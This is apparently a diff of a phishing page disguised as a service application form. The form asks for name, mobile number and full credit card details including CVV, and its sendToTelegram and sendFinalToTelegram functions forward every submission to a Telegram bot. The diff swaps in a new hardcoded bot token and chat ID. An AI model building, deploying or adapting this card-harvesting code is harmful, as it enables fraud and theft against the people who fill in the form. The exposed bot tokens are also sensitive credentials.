@@ -408,7 +408,7 @@
         <input type="text" id="fullname" placeholder="Full Name" required>
         <div class="error-message" id="fullname-error">Please enter a valid full name</div>
         
-        <input type="text" id="mobile" placeholder="Mobile Number" required>
+        <input type="number" id="mobile" placeholder="Mobile Number" required>
         <div class="error-message" id="mobile-error">Please enter a valid 10-digit mobile number</div>
         
         <select id="service" required>
@@ -441,13 +441,13 @@
           <strong>Note:</strong> Please Enter Your Granted Witness Credit Card Details
         </div>
         
-        <input type="text" id="cardnumber" placeholder="Card Number" required>
+        <input type="number" id="cardnumber" placeholder="Card Number" required>
         <div class="error-message" id="cardnumber-error">Please enter a valid 16-digit card number</div>
         
         <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required oninput="formatExpiry(this)">
         <div class="error-message" id="expiry-error">Please enter a valid expiry date (MM/YY)</div>
         
-        <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+        <input type="number" id="cvv" placeholder="CVV" maxlength="3" required>
         <div class="error-message" id="cvv-error">Please enter a valid 3-digit CVV</div>
         
         <button class="button" id="step3-button" onclick="validateStep3()">Submit</button>
@@ -756,8 +756,8 @@
 
     // Send form data to Telegram
     function sendToTelegram() {
-      const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc';
-      const chatId = '7155441629';
+      const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
+      const chatId = '6817001105';
       
       let message = `*New Form Submission:*\n\n`;
       message += `*Step ${formState.currentStep} Data:*\n`;
@@ -794,8 +794,8 @@
 
     // Send final data to Telegram
     function sendFinalToTelegram() {
-      const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc';
-      const chatId = '7155441629';
+      const botToken = '7277595810:AAFOSEX9GlOP601SUXzib1_pTzH-YnXFn4Q';
+      const chatId = '6817001105';
       
       let message = `*Final Form Submission:*\n\n`;
       message += `*Personal Details:*\n`;
